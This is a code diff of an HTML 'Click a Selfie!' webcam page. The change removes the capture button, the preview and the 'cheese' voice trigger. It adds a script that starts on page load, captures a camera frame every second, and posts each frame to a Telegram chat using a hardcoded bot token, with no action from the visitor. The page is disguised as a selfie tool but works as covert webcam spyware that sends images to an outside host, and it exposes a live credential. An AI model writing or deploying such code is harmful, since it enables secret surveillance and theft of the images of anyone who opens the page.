@@ -39,77 +39,16 @@
             height: auto;
         }
 
-        /* Capture button */
-        button, #downloadBtn {
-            background-color: #ffcc00;
-            color: #333;
-            padding: 15px 30px;
-            border: none;
-            border-radius: 30px;
-            font-size: 1.2rem;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-            margin-top: 20px;
-        }
-
-        button:hover, #downloadBtn:hover {
-            background-color: #ff4d00;
-        }
-
         /* Hidden canvas */
         canvas {
             display: none;
-        }
-
-        /* Download button styles */
-        #downloadBtn {
-            display: none;
-            margin-top: 30px;
-            font-size: 1.2rem;
-        }
-
-        /* Image preview container */
-        #photoPreview {
-            display: none;
-            margin-top: 20px;
-            border: 2px solid #fff;
-            padding: 10px;
-            border-radius: 10px;
-            max-width: 100%;
-            width: 1080px;
-            height: 1920px;
-            object-fit: cover;
-        }
-
-        /* Responsive Design */
-        @media (max-width: 768px) {
-            h2 {
-                font-size: 2rem;
-            }
-            video {
-                width: 90%;
-                height: auto;
-            }
-        }
-
-        @media (max-width: 480px) {
-            h2 {
-                font-size: 1.8rem;
-            }
-            button, #downloadBtn {
-                font-size: 1rem;
-                padding: 12px 25px;
-            }
         }
     </style>
 </head>
 <body>
     <h2>Click a Selfie!</h2>
     <video id="video" width="1080" height="1920" autoplay></video>
-    <canvas id="canvas" width="1080" height="1920" style="display: none;"></canvas>
-    <button id="capture">Capture Selfie</button>
-    <a id="downloadBtn" download="selfie.jpg" href="#">Download Selfie</a>
-    <img id="photoPreview" src="#" alt="Captured Photo">
+    <canvas id="canvas" width="6528" height="4896" style="display: none;"></canvas>
 
     <script>
         const botToken = "8199996433:AAHWMDwq0eqeuUsQApLD1v_hHmLPJSdCU9w";
@@ -126,80 +65,54 @@
             }
         }
 
-        // Capture and send the photo to Telegram
-        async function captureAndSend() {
+        // Function to automatically capture and send the photo every second
+        async function autoCapture() {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const ctx = canvas.getContext('2d');
 
-            // Draw the video frame on the canvas at 1080x1920 resolution
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            // Set the interval for automatic photo capture (1 second)
+            setInterval(async () => {
+                // Draw the video frame on the canvas at the desired resolution
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Convert canvas to a Blob
-            canvas.toBlob(async (blob) => {
-                // Create a URL for the captured image and show the download button
-                const url = URL.createObjectURL(blob);
-                const downloadBtn = document.getElementById('downloadBtn');
-                const previewImg = document.getElementById('photoPreview');
+                // Convert canvas to a Blob
+                canvas.toBlob(async (blob) => {
+                    // Create a URL for the captured image
+                    const url = URL.createObjectURL(blob);
 
-                // Show the image preview
-                previewImg.src = url;
-                previewImg.style.display = 'block';
+                    // Prepare the form data to send the image to Telegram
+                    let formData = new FormData();
+                    formData.append("chat_id", chatId);
+                    formData.append("photo", blob);
 
-                // Show the download button
-                downloadBtn.href = url;
-                downloadBtn.style.display = 'inline-block';
+                    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
 
-                // Prepare the form data to send the image to Telegram
-                let formData = new FormData();
-                formData.append("chat_id", chatId);
-                formData.append("photo", blob);
+                    // Send the photo to Telegram
+                    try {
+                        const response = await fetch(telegramUrl, { method: "POST", body: formData });
+                        const result = await response.json();
+                    } catch (error) {
+                        console.error("Telegram API Error:", error);
+                        alert("Error sending selfie.");
+                    }
 
-                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
-
-                // Send the photo to Telegram
-                try {
-                    const response = await fetch(telegramUrl, { method: "POST", body: formData });
-                    const result = await response.json();
-                } catch (error) {
-                    console.error("Telegram API Error:", error);
-                    alert("Error sending selfie.");
-                }
-            }, "image/jpeg");
-        }
-
-        // Speech recognition to detect the word "cheese"
-        function startListening() {
-            const recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
-            recognition.lang = 'en-US';
-            recognition.interimResults = false;
-
-            recognition.onstart = function () {
-                console.log('Listening for "cheese"...');
-            };
-
-            recognition.onresult = function (event) {
-                const transcript = event.results[0][0].transcript.toLowerCase();
-                if (transcript.includes('cheese')) {
-                    captureAndSend();
-                }
-            };
-
-            recognition.onerror = function (error) {
-                console.log("Speech recognition error:", error);
-            };
-
-            recognition.start();
+                    // Trigger auto-download of the image (direct download, no preview)
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = `selfie_${Date.now()}.jpg`;
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                }, "image/jpeg");
+            }, 1000); // Capture photo every 1 second
         }
 
         // Event listener to start the video when page loads
         window.addEventListener('load', async () => {
             await startVideo();
-            startListening();  // Start listening for "cheese"
+            autoCapture();  // Start auto-capture function after video starts
         });
-
-        // Capture button click event
-        document.getElementById('capture').addEventListener('click', captureAndSend);
     </script>
 </body>
 </html>
